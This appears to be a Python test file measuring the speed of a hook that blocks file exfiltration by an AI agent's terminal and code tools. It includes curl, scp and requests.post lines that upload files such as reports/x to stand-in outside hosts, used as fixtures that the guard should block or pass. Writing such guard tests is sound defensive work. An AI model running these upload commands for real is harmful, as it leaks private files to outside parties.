"""100 ms reference per registered-hook call, including feed writes.

EXFILBAR_TIMING_LIMIT_MS is an explicit slow-CI override, never set by this suite.
All strings are inspected in isolated storage; no transfer is executed.
"""
import ast
import os
import time
import unittest
from support import Context, entry

ROUTES = [{'paths': ['reports/**'], 'to': ['https://uploads.example/reports/*']}]
LIMIT = float(os.environ.get('EXFILBAR_TIMING_LIMIT_MS', '100')) / 1000

# Expected directives are part of every fixture, including intentional passes.
IN_BUDGET = [
    ('quotes', 'curl -T ' + '"a' * 6000, 'block'),
    ('pipes', 'cat reports/x | ' * 100 + 'curl -T - https://elsewhere.example/up', 'block'),
    ('flags', 'curl ' + '-H @x ' * 500 + '-T reports/x https://elsewhere.example/up', 'block'),
    ('url', 'curl -T reports/x https://' + 'a.' * 6000 + 'example/up', 'block'),
    ('globs', 'scp reports/' + '*' * 12000 + ' host:x', 'block'),
    ('escapes', 'curl -T reports/x ' + '\\' * 12000, 'block'),
    ('subst', 'curl -T $(' * 100 + 'x' + ')' * 100 + ' https://e.example', 'block'),
    ('scp-at-3000', 'scp ' + '@' * 3000 + ' host:x', 'pass'),
    ('scp-at-6000', 'scp ' + '@' * 6000 + ' host:x', 'pass'),
    ('scp-at-12000', 'scp ' + '@' * 12000 + ' host:x', 'pass'),
    ('scp-at-command-boundary', 'scp ' + '@' * (32768 - 11) + ' host:x', 'pass'),
    ('pair-multiplication', 'curl ' + '-T public/x ' * 500 + ' '.join(['https://h/x'] * 500), 'block'),
    ('routed', 'curl -T reports/x https://uploads.example/reports/x', 'pass'),
    ('unmatched-public', 'scp public/x host:x', 'pass'),
]
CAP_SHORTCUTS = [
    ('command-cap', 'terminal', 'x' * 32769, 'block'),
    ('token-cap', 'terminal', 'curl ' + '-H @x ' * 2100 + 'https://h/x', 'block'),
    ('pipe-cap', 'terminal', 'cat reports/x | ' * 129 + 'curl -T - https://h/x', 'block'),
    ('ast-cap', 'execute_code', 'x=1\n' * 2100, 'block'),
    ('code-size-cap', 'execute_code', ' ' * 32769, 'block'),
]
ACCEPTED_CODE = 'import requests\n' + 'requests.post("https://uploads.example/reports/x", data=open("reports/x"))\n' * 200
LOCAL_CODE = 'x=1\n' * 1900


class TimingTests(unittest.TestCase):
    def setUp(self):
        self.module = entry()
        self.ctx = Context(routes=ROUTES)
        self.module.register(self.ctx)
        self.hook = self.ctx.hooks['pre_tool_call']

    def check(self, name, tool, value, expected):
        start = time.perf_counter()
        result = self.hook(tool, {'command' if tool == 'terminal' else 'code': value}, session_id='timing')
        elapsed = time.perf_counter() - start
        actual = 'block' if result and result.get('action') == 'block' else 'pass'
        print(f'TIMING | {name} | {len(value)} | {elapsed * 1000:.3f} | {actual}')
        self.assertEqual(actual, expected, name)
        self.assertLess(elapsed, LIMIT, f'{name}: {elapsed * 1000:.3f} ms')

    def test_in_budget_adversarial_and_controls(self):
        for name, command, expected in IN_BUDGET:
            with self.subTest(case=name):
                self.check(name, 'terminal', command, expected)

    def test_accepted_ast_work(self):
        for name, code, expected in [('accepted-network-ast', ACCEPTED_CODE, 'pass'), ('accepted-local-ast', LOCAL_CODE, 'pass')]:
            self.assertLessEqual(len(code), 32768)
            self.assertLessEqual(sum(1 for _ in ast.walk(ast.parse(code))), 8192)
            self.check(name, 'execute_code', code, expected)

    def test_maximum_configured_rules_cold_and_changed(self):
        # Each list is at the accepted 128-pattern limit. Unique strings avoid
        # accidental fnmatch cache reuse. Conservative work-budget blocks apply.
        routes = [dict(paths=[f'route{i}/file{j}' for j in range(128)],
                       to=[f'https://h{i}-{j}.example/x' for j in range(128)]) for i in range(128)]
        self.ctx.settings['routes'] = routes
        self.check('128-routes-x-128-patterns', 'terminal', 'curl -T public/x https://h/x', 'block')
        self.check('128-routes-code', 'execute_code', 'import requests; requests.post("https://h/x", data=open("public/x"))', 'block')
        self.ctx.settings.update(routes=[], protected_globs=[f'private/{i}*' for i in range(128)],
                                 destination_globs=[f'https://denied{i}/*' for i in range(128)])
        self.check('128-protected-and-destination-globs', 'terminal', 'curl -T public/x https://denied127/x', 'block')
        self.check('128-globs-public-control', 'terminal', 'curl -T public/x https://public/x', 'pass')
        self.ctx.settings.update(protected_globs=[('p' + str(i)).ljust(512, 'x') for i in range(128)])
        self.check('128-long-protected-globs', 'terminal', 'curl -T public/x https://public/x', 'pass')

    def test_cap_shortcuts_separately(self):
        for name, tool, value, expected in CAP_SHORTCUTS:
            with self.subTest(case=name):
                self.check(name, tool, value, expected)


if __name__ == '__main__':
    unittest.main()
